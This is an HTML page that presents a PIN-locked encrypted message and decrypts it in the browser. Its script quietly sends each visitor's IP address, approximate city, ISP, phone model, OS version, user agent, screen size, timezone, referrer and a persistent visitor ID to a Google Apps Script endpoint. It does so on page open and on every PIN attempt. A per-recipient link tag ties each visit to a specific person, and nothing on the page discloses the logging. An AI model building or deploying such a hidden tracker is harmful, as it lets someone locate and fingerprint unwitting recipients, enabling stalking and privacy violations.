<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>Message</title>
<meta property="og:title" content="Message">
<style>
  :root { --bg:#fff; --ink:#111827; --line:#D1D5DB; --error:#DC2626; color-scheme: light; }
  @media (prefers-color-scheme: dark) {
    :root { --bg:#111318; --ink:#E5E7EB; --line:#3F4451; --error:#F87171; color-scheme: dark; }
  }
  * { box-sizing: border-box; }
  html, body { height: 100%; margin: 0; }
  body {
    background: var(--bg); color: var(--ink);
    font: 17px/1.6 system-ui, -apple-system, "Segoe UI", sans-serif;
    display: grid; place-items: center; padding: 24px 20px;
  }
  .pins { display: flex; gap: 8px; }
  .pins input {
    width: 44px; height: 54px; text-align: center; font-size: 24px;
    border: 1px solid var(--line); border-radius: 8px;
    background: transparent; color: var(--ink);
    -webkit-text-security: disc;
  }
  .pins input:focus-visible { outline: 2px solid var(--ink); outline-offset: 1px; }
  .pins.wrong input { border-color: var(--error); }
  .message { display: none; max-width: 520px; white-space: pre-wrap; overflow-wrap: anywhere; }
</style>
</head>
<body>
<div class="pins" id="pins">
  <input inputmode="numeric" maxlength="1" aria-label="Digit 1" autocomplete="one-time-code" autofocus>
  <input inputmode="numeric" maxlength="1" aria-label="Digit 2">
  <input inputmode="numeric" maxlength="1" aria-label="Digit 3">
  <input inputmode="numeric" maxlength="1" aria-label="Digit 4">
  <input inputmode="numeric" maxlength="1" aria-label="Digit 5">
  <input inputmode="numeric" maxlength="1" aria-label="Digit 6">
</div>
<div class="message" id="message"></div>

<script>
/* ============ EDIT THESE ============ */
const CONFIG = {
  LOG_URL: "https://script.google.com/macros/s/AKfycbyk_8l2rcF8m_0DROsauXpMrHyudXuBbdGkho2B9CRMq2twaoymf8tC_j1RAcV8Yjr_gA/exec",
  // Output of encrypt.html
  ENCRYPTED: {"iter":300000,"salt":"Vsehi2aeoyPl+nsLfh0clA==","iv":"gjJ/2NOAbL5ZeDFP","data":"tSQrbE1IaRFVkBRZGSLwtul5MTRUvGKu3PMLMUgjGsfrVEijM9fiQKEcmes1p2mVW2nU8N6zVvI+crmdDrCUR9PkvbvYxO36/dxe3nAvcGvh+roqjkjLfwjM28rT4Bm8sSIpY72Wi/L1APsNNYLlzf3Dhz17YktTJ3MNw10Gxpx4to+jRJik5EnF+kYowTpfrwRqGvFUE2UKq1ymW6R3HwiymgzTpXr+KBybCeFQt8Yhh2Ls2wBZr2hXbddszZxSjzIkL1FdtEYDufZO5cRbZhLzJShE/45FpzhgaUrD0kylBTr7RR0aNvxQKalF+ACMKJLrDCqy93M2N9RyGkKaaCrCUZJbwhFRBsk7B32grTciZrXUH59afR2G9j2RoiAt/uhJGz1ppEnVVVDtXNyTHbMUHJZV9WBbplOv7V5Cdn2ZQXC+2olrNxjDmmYshSdGe4kV39VAAvtvucgGChloGDDcr21s/pSxp6lLpaVBy2UYfbaCl8GEPm72zVjbMWGiOY0DnAagnXIfGUmRQZF9O2LTy+6VT5Js+FiVLbdGoH92pDD6"}
};
/* ==================================== */

// Same browser = same visitor ID, so repeat visits are linked
let visitorId = "", visitCount = 1;
try {
  visitorId = localStorage.getItem("vid") || Math.random().toString(36).slice(2, 10);
  visitCount = (+localStorage.getItem("vcount") || 0) + 1;
  localStorage.setItem("vid", visitorId);
  localStorage.setItem("vcount", visitCount);
} catch { visitorId = "no-storage"; }

// Tag from the link, e.g. .../msg/?r=bub  ->  "bub"
const TAG = (new URLSearchParams(location.search).get("r") || "").slice(0, 30);

// Approximate city + internet provider (looked up once)
async function lookup(url, pick) {
  const c = new AbortController();
  const t = setTimeout(() => c.abort(), 3000);
  try {
    const j = await (await fetch(url, { signal: c.signal })).json();
    return pick(j);
  } finally { clearTimeout(t); }
}
const netInfo = (async () => {
  try {
    return await lookup("https://ipwho.is/", j => {
      if (j.success === false) throw 0;
      return { ip: j.ip, city: [j.city, j.region].filter(Boolean).join(", "),
               isp: (j.connection && (j.connection.isp || j.connection.org)) || "" };
    });
  } catch {}
  try {
    return await lookup("https://ipapi.co/json/", j => {
      if (j.error) throw 0;
      return { ip: j.ip, city: [j.city, j.region].filter(Boolean).join(", "), isp: j.org || "" };
    });
  } catch {}
  return {};
})();

// Real phone model (Chrome on Android hides it from the normal user agent)
const hints = (async () => {
  try {
    if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
      const h = await navigator.userAgentData.getHighEntropyValues(["model", "platformVersion"]);
      return { model: h.model || "", osver: h.platformVersion || "" };
    }
  } catch {}
  return {};
})();

async function log(event) {
  if (!CONFIG.LOG_URL || CONFIG.LOG_URL.startsWith("PASTE")) return;
  const net = await netInfo;
  const hw = await hints;
  fetch(CONFIG.LOG_URL, {
    method: "POST", mode: "no-cors", keepalive: true,
    headers: { "Content-Type": "text/plain;charset=utf-8" },
    body: JSON.stringify({
      event, tag: TAG, visitor: visitorId, visit: visitCount,
      model: hw.model || "", osver: hw.osver || "",
      city: net.city || "", isp: net.isp || "", ip: net.ip || "",
      ua: navigator.userAgent,
      screen: `${screen.width}x${screen.height}`,
      tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
      ref: document.referrer
    })
  }).catch(() => {});
}
log("opened");

const pins = [...document.querySelectorAll("#pins input")];
pins.forEach((inp, i) => {
  inp.addEventListener("input", () => {
    inp.value = inp.value.replace(/\D/g, "").slice(-1);
    document.getElementById("pins").classList.remove("wrong");
    if (inp.value && i < 5) pins[i + 1].focus();
    tryUnlock();
  });
  inp.addEventListener("keydown", e => {
    if (e.key === "Backspace" && !inp.value && i > 0) pins[i - 1].focus();
  });
  inp.addEventListener("paste", e => {
    const d = (e.clipboardData.getData("text") || "").replace(/\D/g, "").slice(0, 6);
    if (!d) return;
    e.preventDefault();
    d.split("").forEach((c, j) => pins[j].value = c);
    pins[Math.min(d.length, 5)].focus();
    tryUnlock();
  });
});

const unb64 = s => Uint8Array.from(atob(s), c => c.charCodeAt(0));
async function decrypt(pin) {
  const { iter, salt, iv, data } = CONFIG.ENCRYPTED;
  const base = await crypto.subtle.importKey("raw", new TextEncoder().encode(pin), "PBKDF2", false, ["deriveKey"]);
  const key = await crypto.subtle.deriveKey(
    { name: "PBKDF2", salt: unb64(salt), iterations: iter, hash: "SHA-256" },
    base, { name: "AES-GCM", length: 256 }, false, ["decrypt"]);
  return new TextDecoder().decode(
    await crypto.subtle.decrypt({ name: "AES-GCM", iv: unb64(iv) }, key, unb64(data)));
}

let busy = false, fails = 0, lockedUntil = 0;
async function tryUnlock() {
  const pin = pins.map(p => p.value).join("");
  if (pin.length < 6 || busy || Date.now() < lockedUntil) return;
  busy = true;
  pins.forEach(p => p.disabled = true);
  try {
    const text = await decrypt(pin);
    log("unlocked");
    document.getElementById("pins").style.display = "none";
    const m = document.getElementById("message");
    m.textContent = text;
    m.style.display = "block";
  } catch {
    log("wrong_pin");
    if (++fails % 5 === 0) lockedUntil = Date.now() + 30000;
    document.getElementById("pins").classList.add("wrong");
    pins.forEach(p => { p.value = ""; p.disabled = false; });
    pins[0].focus();
  } finally { busy = false; }
}
</script>
</body>
</html>
